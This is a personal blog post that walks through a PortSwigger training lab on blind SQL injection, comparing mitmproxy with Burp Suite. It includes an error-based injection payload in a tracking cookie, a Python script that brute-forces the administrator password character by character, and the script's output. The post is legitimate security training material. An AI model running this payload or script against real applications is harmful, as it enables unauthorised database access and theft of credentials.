<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Using mitmproxy instead of burpsuite? (exploring a blind sqli portswigger lab) - Youssef Hesham - Software, security and chess </title><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=referrer content="no-referrer"><meta property="og:site_name" content="Youssef Hesham - Software, security and chess"><meta property="og:locale" content="en_US"><meta property="og:url" content="/blog/using-mitmproxy-instead-of-burpsuite-sqli/"><meta property="og:site_name" content="Youssef Hesham - Software, security and chess"><meta property="og:title" content="Using mitmproxy instead of burpsuite? (exploring a blind sqli portswigger lab)"><meta property="og:description" content="PortSwigger made a powerful tool burpsuite for performing security testing of web applications. in its community edition it includes tools like repeater, decoder/encoder, burp intruder which helps in modifying http requests and study its behaviour.
mitmproxy is a free opensource interactive https proxy. its features includes intercepting HTTP & HTTPS requests, save http conversations for later replay analysis, make scripted changes for http traffic using python
for whatever reason, i will try using mitmproxy to solve a blind sql inejection vulnerability using mitmproxy. the lab description goes like. the goal here is to try to solve this challenge by using mitmproxy and not burpsuite, python scripting is permitted of course."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2022-08-24T01:00:00+00:00"><meta property="article:modified_time" content="2022-08-24T01:00:00+00:00"><meta property="article:tag" content="Mitmproxy"><meta property="article:tag" content="Burpsuite"><meta property="article:tag" content="Portswigger"><meta property="article:tag" content="Blind Sql Injection"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Using mitmproxy instead of burpsuite? (exploring a blind sqli portswigger lab)"><meta name=twitter:description content="Youssef's personal website/Blog. tech, opinions and chess."><meta name=twitter:image content="/"><link rel=canonical href=/blog/using-mitmproxy-instead-of-burpsuite-sqli/><link rel=stylesheet href=/css/site.min.css><link rel=stylesheet href=/css/custom.css><link rel=apple-touch-icon sizes=180x180 href=/img/fav/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/img/fav/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/img/fav/favicon-16x16.png><link rel=manifest href=/img/fav/site.webmanifest><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><div class="mt-xl header"><header><div class=container><div class="row justify-content-center"><div class=col-auto><a href=/ style=display:contents><h1 class="name text-center">Youssef Hesham</h1></a></div></div><div class="row justify-content-center"><div class="nav justify-content-center"><ul><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=/>~/</a></li><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=/about>About</a></li><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=https://github.com/iossefy>Github</a></li><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=/index.xml>rss</a></li></ul></div></div></div></header></div><div class=content><div class=container><div class="row justify-content-center"><div class="col-sm-12 col-lg-8"><h1 class="mx-0 mx-md-4 blog-post-title">Using mitmproxy instead of burpsuite? (exploring a blind sqli portswigger lab)</h1><div class="meta-data meta"><div class="d-none d-md-inline meta-brief">Trying to use mitmproxy instead of burpsuite for exploiting a blind sql injection bug.</div><span class="author meta-data" title="Youssef Hesham">Youssef Hesham
</span><span class="date middot meta-data" title='Wed Aug 24 2022 01:00:00 UTC'>2022-08-24
</span><span class="reading-time middot meta-data">5 min read
</span><a class="middot meta-data" href=/blog/using-mitmproxy-instead-of-burpsuite-sqli/>Permalink</a><div class="d-none d-md-inline tags"><ul class="list-unstyled d-inline"><li class=d-inline style=margin-right:.5rem><a href=/tags/mitmproxy>#mitmproxy</a></li><li class=d-inline style=margin-right:.5rem><a href=/tags/burpsuite>#burpsuite</a></li><li class=d-inline style=margin-right:.5rem><a href=/tags/portswigger>#portswigger</a></li><li class=d-inline style=margin-right:.5rem><a href=/tags/blind-sql-injection>#blind sql injection</a></li></ul></div></div><div class="markdown blog-post-content"><p><span class=first-letter>P</span>ortSwigger made a powerful tool <code>burpsuite</code> for performing security testing of
web applications. in its community edition it includes tools like repeater,
decoder/encoder, burp intruder which helps in modifying http requests and study
its behaviour.</p><p><code>mitmproxy</code> is a free opensource interactive https proxy. its features includes
intercepting HTTP & HTTPS requests, save http conversations for later replay
analysis, make scripted changes for http traffic using python</p><p>for whatever reason, i will try using mitmproxy to solve a blind sql inejection
vulnerability using mitmproxy. the lab description goes like.
the goal here is to try to solve this challenge by using mitmproxy and not
burpsuite, python scripting is permitted of course.</p><h4 id=challenge-description>Challenge description</h4><blockquote><p>This lab contains a blind SQL injection vulnerability. The application uses a
tracking cookie for analytics, and performs an SQL query containing the value
of the submitted cookie. The results of the SQL query are not returned, and
the application does not respond any differently based on whether the query
returns any rows. If the SQL query causes an error, then the application
returns a custom error message. The database contains a different table
called users, with columns called username and password. You need to exploit
the blind SQL injection vulnerability to find out the password of the
administrator user. To solve the lab, log in as the administrator user.</p></blockquote><h4 id=exploring-mitmproxy>exploring mitmproxy</h4><p>after setting up the browser, and opening <code>mitmproxy</code> i will make a get request to <code>/</code> using the browser.
looking at mitmproxy i see a lot of requests.</p><p><img src=/img/posts/mitmproxy-burpsuite/1.png alt="mitmproxy with a lot of requests"></p><p>a lot of them are just images (svg,png,etc&mldr;). i don&rsquo;t need those on my screen
so i will filter them using <code>mitmproxy's filter expressions</code></p><p>just by pressing the <code>f</code> key, at the bottom it will prompt you to inter a filter expression.</p><div class="alert alert-info" role=alert>you can get filter expressions list by pressing ? key</div><p>i found the following</p><pre>
~c              status code
~u regex        URL
!               unary not
&               and
|               or
(...)           grouping
</pre><p>i can filter the images by: <code>set view_filter '!(~u /image)'</code></p><p><img src=/img/posts/mitmproxy-burpsuite/2.png alt="mitmproxy with a lot of requests"></p><p>i still see a problem. i want to focus on just one domain the domain of the challenge.
using the following solves the issue</p><p><code>set view_filter 'web-security-academy.net & !(~u /image)'</code></p><p>playing with it i found this to filter all unwanted requests.</p><pre>
~u web-security-academy.net & !(~u /image | ico | css)
</pre><p><img src=/img/posts/mitmproxy-burpsuite/3.png alt=clean></p><p>you can intercept requests by pressing <code>i</code> and use <code>filter expressions</code> to
select which requests you want to intercept and which ones to ignore. by using
<code>~q</code> you intercept all request. but we don&rsquo;t need that now so ignore this</p><p>now i will press <code>z</code> to clear all flows and make a new request with the
browser. i&rsquo;ll select the first request.</p><p><img src=/img/posts/mitmproxy-burpsuite/4.png alt="first request"></p><p>let&rsquo;s try to see if the cookie <code>TrackingId=iubY1Hw83n9Ea9m2;</code> is vulnerable to sqli.
i will just append a single quote to it at the end.</p><p>press <code>e</code> to edit the request and then press <code>1</code> to edit the cookies.</p><p><img src=/img/posts/mitmproxy-burpsuite/5.png alt="first request"></p><pre>
Cookie: TrackingId=iubY1Hw83n9Ea9m2'
</pre><p>after finishing press <code>escape</code> to return to the request and then press <code>r</code> to <code>replay</code> the request.
it did respond with error <code>505 internal server error</code></p><p><img src=/img/posts/mitmproxy-burpsuite/6.png alt=clean></p><p>The goal of this blog post is not to write a writeup about how to exploit this
blind sql vulnerability. its goal is to try using mitmproxy as an alternative
to burpsuite and see it it makes that diffirence. you can read the solution
here on <a href=https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors>portswigger web security academy</a>.</p><p>after going through the challenge. to get the password you have this query where
<code>xyz</code> is your cookie and <code>SUBSTR(password,1,1)='A'</code> is guessing the password
character by character.</p><pre>
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='A' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
</pre><p>in portswigger&rsquo;s writeup they used burp intruder to automate the process. but unfortunately mitmproxy has no similar feature so i wrote python script to do it for me.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6272a4>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> requests<span style=color:#ff79c6>,</span> urllib3
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> string <span style=color:#ff79c6>import</span> ascii_lowercase, digits
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>urllib3<span style=color:#ff79c6>.</span>disable_warnings()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># your challenge url</span>
</span></span><span style=display:flex><span>url <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;https://your-challenge-url.web-security-academy.net/&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>proxies <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;https&#34;</span>: <span style=color:#f1fa8c>&#34;http://127.0.0.1:8080&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>req <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>Session()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>abc123 <span style=color:#ff79c6>=</span> ascii_lowercase <span style=color:#ff79c6>+</span> digits
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Your cookie here</span>
</span></span><span style=display:flex><span>headers <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#34;Cookie&#34;</span>: <span style=color:#f1fa8c>&#34;TrackingId=xyz&#34;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>make_query</span>(c: <span style=color:#8be9fd;font-style:italic>str</span>, count: <span style=color:#8be9fd;font-style:italic>int</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>:
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;&#39;||(SELECT CASE WHEN SUBSTR(password,1,</span><span style=color:#f1fa8c>{</span>count<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)=&#39;</span><span style=color:#f1fa8c>{</span>c<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39; THEN to_char(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pass_len <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>20</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>solve</span>() <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>:
</span></span><span style=display:flex><span>    j <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
</span></span><span style=display:flex><span>    count <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>while</span> <span style=color:#8be9fd;font-style:italic>len</span>(j) <span style=color:#ff79c6>!=</span> pass_len:
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> abc123:
</span></span><span style=display:flex><span>            cookie <span style=color:#ff79c6>=</span> headers[<span style=color:#f1fa8c>&#39;Cookie&#39;</span>]<span style=color:#ff79c6>+</span>make_query(j<span style=color:#ff79c6>+</span>i, count)
</span></span><span style=display:flex><span>            H <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#34;Cookie&#34;</span>: cookie}
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;Trying: </span><span style=color:#f1fa8c>{</span>H[<span style=color:#f1fa8c>&#39;Cookie&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span><span style=display:flex><span>            x <span style=color:#ff79c6>=</span> req<span style=color:#ff79c6>.</span>get(url,
</span></span><span style=display:flex><span>                        headers<span style=color:#ff79c6>=</span>H,
</span></span><span style=display:flex><span>                        proxies<span style=color:#ff79c6>=</span>proxies,
</span></span><span style=display:flex><span>                        verify<span style=color:#ff79c6>=</span><span style=color:#ff79c6>False</span>)
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> x<span style=color:#ff79c6>.</span>status_code <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>500</span>:
</span></span><span style=display:flex><span>                count <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span>                j <span style=color:#ff79c6>+=</span> i
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[+] Found: </span><span style=color:#f1fa8c>{</span>i<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>print</span>(j)
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>continue</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> j
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;administrator:</span><span style=color:#f1fa8c>{</span>solve()<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span></code></pre></div><p>i add this part to pass all the requests on mitmproxy to see how is everything going.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>proxies <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;https&#34;</span>: <span style=color:#f1fa8c>&#34;http://127.0.0.1:8080&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>the script output goes like</p><pre>
Trying: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Trying: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='b' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Trying: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='c' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
[+] Found: c

Trying: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,2)='cd' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

...
...
...

administrator:cwok4lewga8jbhkodnb6

</pre><p>now let&rsquo;s see how mitmproxy is doing.</p><p><img src=/img/posts/mitmproxy-burpsuite/7.png alt=mitmproxy></p><p>using a filter expression</p><pre>
~u web-security-academy.net & !(~u /image | ico | css) & ~c 500
</pre><p>adding <code>~c 500</code> to filter the status code
<img src=/img/posts/mitmproxy-burpsuite/8.png alt="only err 500"></p><h4 id=conclusion>Conclusion</h4><h5 id=burpsuite>burpsuite</h5><p>burpsuite is a very powerful tool with many features</p><ul><li>easy to use</li><li>beginner friendly GUI</li><li>has a lot of tools built-in</li><li>it&rsquo;s meant for web application security</li><li>burp scanner (Professional edition)</li></ul><h5 id=mitmproxy>mitmproxy</h5><p>you can replace burpsuite with mitmproxy but you will have to give up many burp advantages.
if you are going to use mitmproxy you will have to</p><ul><li>do everything manually</li><li>write scripts to automate tasks</li><li>Learn mitmproxy&rsquo;s interface</li><li>use other tools (like <code>sqlmap</code> for example) along side with mitmproxy to do automated scanning.</li></ul></div></div><hr class=footer-linebreak><div class=container><span class="row justify-content-center meta" id=footer>Copyright Â© 2025 Youssef Hesham
</span><script defer src=/js/custom.js></script></div></div></div></div></body></html>